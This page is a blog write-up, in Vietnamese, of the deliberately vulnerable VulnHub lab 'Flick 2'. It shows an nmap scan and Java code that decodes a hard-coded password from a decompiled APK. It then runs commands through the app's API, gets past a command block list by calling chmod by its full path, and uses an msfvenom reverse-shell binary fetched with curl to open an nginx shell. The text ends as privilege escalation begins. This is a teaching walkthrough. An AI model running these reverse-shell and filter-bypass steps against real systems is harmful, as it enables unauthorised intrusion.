@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewLink download: FLICK: 2Difficulty: Intermediate (Depends on experience)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[VulnHub] Flick 2">
+<meta property="og:url" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewLink download: FLICK: 2Difficulty: Intermediate (Depends on experience)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/flick2-vulnhub.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/1.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/10.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/2.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/3.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/4.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/5.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/6.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/7.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/8.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/9.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/11.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/12.png">
+<meta property="article:published_time" content="2021-06-25T07:12:35.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.542Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="easy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/flick2-vulnhub.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2021/06/25/flick2-vulnhub/","path":"2021/06/25/flick2-vulnhub/","title":"[VulnHub] Flick 2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[VulnHub] Flick 2 | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-code-analytics"><span class="nav-number">3.</span> <span class="nav-text">Source code analytics</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Postman"><span class="nav-number">3.1.</span> <span class="nav-text">Postman</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Command-Execution-to-nginx-shell"><span class="nav-number">4.</span> <span class="nav-text">Command Execution to nginx shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">5.</span> <span class="nav-text">Privilege Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nginx-to-robin"><span class="nav-number">5.1.</span> <span class="nav-text">nginx to robin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#robin-to-bryan"><span class="nav-number">5.2.</span> <span class="nav-text">robin to bryan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bryan-to-sean"><span class="nav-number">5.3.</span> <span class="nav-text">bryan to sean</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sean-to-root"><span class="nav-number">5.4.</span> <span class="nav-text">sean to root</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2021/06/25/flick2-vulnhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[VulnHub] Flick 2 | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [VulnHub] Flick 2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-06-25 14:12:35" itemprop="dateCreated datePublished" datetime="2021-06-25T14:12:35+07:00">2021-06-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>10 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/flick2-vulnhub.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/flick-2,122/">FLICK: 2</a><br>Difficulty: Intermediate (Depends on experience)</p>
+<span id="more"></span>
+<p>IP Victim: 192.168.56.104<br>IP Attacker: 192.167.56.102</p>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><p>Trong thư mục đề bài có 3 file gồm:</p>
+<ul>
+<li>flick-check-dist.apk</li>
+<li>flickII-dist.ova</li>
+<li>README</li>
+</ul>
+<p>Mục đích của bài là dịch ngược và phân tích mã nguồn của file APK, và dùng cách vi diệu nào đó để tấn công và chiếm quyền điều khiển của máy mục tiêu.<br>Kết quả scan nmap máy mục tiêu đéo đem lại gì khả quan vì nó mở đúng 1 port 443.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p- -sC -sV 192.168.56.104</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 05:34 EDT</span><br><span class="line">Nmap scan report for 192.168.56.104</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE   VERSION</span><br><span class="line">443/tcp open  ssl/https nginx/1.6.3</span><br><span class="line">|_http-server-header: nginx/1.6.3</span><br><span class="line">|_http-title: 400 The plain HTTP request was sent to HTTPS port</span><br><span class="line">| ssl-cert: Subject: commonName=flick.local/organizationName=Flick/stateOrProvinceName=North South/countryName=ZA</span><br><span class="line">| Not valid before: 2015-06-23T14:43:54</span><br><span class="line">|_Not valid after:  2024-09-08T14:43:54</span><br><span class="line">|_ssl-date: 2021-06-23T16:34:57+00:00; +6h59m59s from scanner time.</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 6h59m58s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds</span><br></pre></td></tr></table></figure>
+<p>Dễ nhận thấy dịch vụ chạy trêng port 443 HTTPS, là một API service để từ ứng dụng cài đặt từ file APK kia kết nối tới.<br>Cài đặt ứng dụng xem nó làm cái vẹo gì đã.<br><img src="/2021/06/25/flick2-vulnhub/1.png"><br>Hmm…<br>Có vẻ như cái app này đang chạy lệnh trực tiếp lên máy mục tiêu, vậy nên nếu tôi biết được API endpoint, tôi cũng có thể thực thi lệnh trực tiếp trên máy mục tiêu, RCE ez!<br>Vấn đề là giờ phải tìm được API endpoint. Xời, đọc mã nguồn thôi!<br>Dùng JADX (<a target="_blank" rel="noopener" href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a>) để decompiler file APK này, tôi nhận được mã nguồn ở dạng code Java cực kỳ dễ đọc. (Repo hơn 26k star Github có khác, uy tín vl).</p>
+<h2 id="Source-code-analytics"><a href="#Source-code-analytics" class="headerlink" title="Source code analytics"></a>Source code analytics</h2><p>Trong CommandActivity.java, dòng 147, class SSHCommand, có thể nhận thấy task đang thực hiện kết nối SSH để thực hiện lệnh, với user <em>robin</em>, mật khẩu được truyền vào từ hàm <em>validate()</em> dòng 138. Tại hàm <em>validate()</em> có tham số <em>input</em>, khi được gọi, biến được truyền vào là (dòng 33):</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">integrity_check</span> <span class="operator">=</span> <span class="string">&quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/flick2-vulnhub/10.png"><br>Có thể thấy ngay output của hàm <em>validate()</em> chính là mật khẩu của user <em>robin</em>, dễ vl, code lại một chút là lấy được mật khẩu, ez.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExploitFlick</span> &#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="string">&quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(input.getBytes()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> validate(text);</span><br><span class="line">        System.out.println(password);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">validate</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] key = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;!&#x27;</span>&#125;;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">            output.append((<span class="type">char</span>) (input.charAt(i) ^ key[i % key.length]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 40373df4b7a1f413af61cf7fd06d03a565a51898</span></span><br></pre></td></tr></table></figure>
+<p>Lấy được tài khoản trên máy mục tiêu là <code>robin:40373df4b7a1f413af61cf7fd06d03a565a51898</code><br>Ơ nhưng mà lịt pẹ, máy mục tiêu mở độc 1 port duy nhất là 443, có thông tin đăng nhập SSH cũng không đăng nhập được vì dịch vụ SSH không mở :&#x2F;<br>Ngán ngẩm quay lại với đống mã nguồn…<br>Tại dòng 41, trong hàm <em>onCreate()</em> file DoRegisterActivity.java, có thể thấy một endpoint cho phép đăng ký thiết bị.<br><img src="/2021/06/25/flick2-vulnhub/2.png"><br>Kéo xuống một chút, sau khi đã biết được endpoint, giờ thì phải xem API endpoint này yêu cầu những param gì, method gì,… mất khoảng 30s ngắm nghía, tôi nhận ra endpoint này chỉ yêu cầu mỗi param <em>uuid</em> và dữ liệu gửi lên dạng JSON với phương thức POST.<br><img src="/2021/06/25/flick2-vulnhub/3.png"><br>He, mở Postman lên bắn request luôn.</p>
+<h3 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h3><p><img src="/2021/06/25/flick2-vulnhub/4.png"><br>Okay, reponse trả về cho thấy có vẻ tôi đã đăng ký thiết bị thành công với<br><code>UUID = 1, token = FmOBOJSrsOw8aaCZtrT1Ro1DSPBRSE11</code><br>Giờ thì phải tìm hiểu xem cái token mà máy chủ dịch vụ cấp cho tôi được dùng để làm việc gì.<br>Ngồi ngâm code và uống C sủi, nhận thấy một endpoint cho phép thực thi lệnh trong CommandActivity.java, có thể đây chính là endpoint mà app đã dùng để thực thi lệnh, với các param header <em>X-UUID</em> và <em>X-TOKEN</em>, 2 param header này chính là UUID và token mà tôi đã có ở trên. Lệnh thực thi được mã hoá với base64 và nối vào cuối URI.<br><img src="/2021/06/25/flick2-vulnhub/5.png"><br>Bây giờ tôi sẽ thử thực thi lệnh <code>id</code> có mã base64 là <code>aWQ=</code>.<br><img src="/2021/06/25/flick2-vulnhub/6.png"><br>Ngon luôn!<br>Giờ thì xem xem trên máy mục tiêu có python không, để chạy lệnh và lấy reverse shell.<br><code>which python</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;error&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;output&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Command &#x27;which python&#x27; contains a banned command.&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>Ầu men, câu lệnh bị chặn cmnr. Có thể là chặn theo Black list, vì các lệnh như <code>w, lscpu, id, free, ping, curl, cp</code> vẫn có thể thực hiện ngon lành. Kệ đi, tạo reverse shell ELF rồi tải vào máy mục tiêu cái đã. Với lệnh <code>lscpu</code>, có thể nhận thấy máy chủ đang chạy là Linux x64.</p>
+<h2 id="Command-Execution-to-nginx-shell"><a href="#Command-Execution-to-nginx-shell" class="headerlink" title="Command Execution to nginx shell"></a>Command Execution to <em>nginx</em> shell</h2><p>Tạo một file thực thi để lấy reverse shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 LHOST=192.168.56.102 -f elf -o duma443.elf</span><br></pre></td></tr></table></figure>
+<p>Chạy HTTP server trên máy của tôi và thực thi lệnh <code>curl</code> trên máy mục tiêu để lấy file <em>duma443.elf</em> về máy mục tiêu.<br><img src="/2021/06/25/flick2-vulnhub/7.png"><br>Có request từ máy mục tiêu (IP 192.168.56.104)<br><img src="/2021/06/25/flick2-vulnhub/8.png"><br>Set quyền thực thi cho file <code>/tmp/duma443.elf</code>, nhưng…</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;error&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;output&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Command &#x27;chmod +x /tmp/duma443.elf&#x27; contains a banned command.&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>Mẹ nó, <code>chmod</code> nằm trong Black list.<br>Vuốt râu một lúc, tôi nhận ra là tôi đang không biết máy mục tiêu đang chặn lệnh thực thi như thế nào? Có thật là Black list? Hay dùng regex để detect ra chuỗi có trong Black list? Có một cách để biết được điều này, là thử dùng đường dẫn tuyệt đối.<br>Bây giờ không dùng <code>chmod</code> nữa, mà dùng <code>/usr/bin/chmod</code>, nếu lệnh <code>/usr/bin/chmod</code> vẫn bị ban, thì có nghĩa là API endpoint đang detect theo regex, nhưng nếu không bị ban, thì có lẽ API endpoint chỉ đang chặn theo word. Try it!<br><code>/usr/bin/chmod +x /tmp/duma443.elf</code><br><img src="/2021/06/25/flick2-vulnhub/9.png"><br>Chặn gà vl!<br>Bậy lắng nghe trên port 443 và lấy reverse shell.<br><code>/tmp/duma443.elf</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 443              </span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::443</span><br><span class="line">Ncat: Listening on 0.0.0.0:443</span><br><span class="line">Ncat: Connection from 192.168.56.104.</span><br><span class="line">Ncat: Connection from 192.168.56.104:52785.</span><br><span class="line">bash-4.2$ id</span><br><span class="line">id</span><br><span class="line">uid=998(nginx) gid=997(nginx) groups=997(nginx)</span><br></pre></td></tr></table></figure>
+<p>Sử dụng thông tin đăng nhập vào user <em>robin</em> đã lấy được ở trên, login vào.</p>
